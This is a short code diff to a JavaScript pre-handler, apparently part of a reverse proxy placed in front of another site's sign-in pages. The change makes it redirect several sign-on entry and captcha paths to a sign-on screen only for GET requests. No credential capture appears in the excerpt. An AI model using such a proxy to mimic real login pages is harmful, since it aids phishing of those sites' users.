@@ -95,11 +95,13 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             return super.cleanEnd(clientContext.currentDomain, clientContext)
         }
         
-        if (this.req.url ==='/login/sign-in/captcha/signOnV2.go'
-        || this.req.url === '/login/sign-in/internal/entry/signOnV2.go'
-        || this.req.url === '/sign-in/internal/entry/signOnV2.go') {
-            this.res.writeHead(302, {location: '/login/sign-in/signOnV2Screen.go'})
-            return super.cleanEnd(clientContext.currentDomain, clientContext)
+        if (this.req.method === 'GET') {
+            if (this.req.url ==='/login/sign-in/captcha/signOnV2.go'
+            || this.req.url === '/login/sign-in/internal/entry/signOnV2.go'
+            || this.req.url === '/sign-in/internal/entry/signOnV2.go') {
+                this.res.writeHead(302, {location: '/login/sign-in/signOnV2Screen.go'})
+                return super.cleanEnd(clientContext.currentDomain, clientContext)
+            }
         }
 
         return super.superExecuteProxy(clientContext.currentDomain, clientContext)
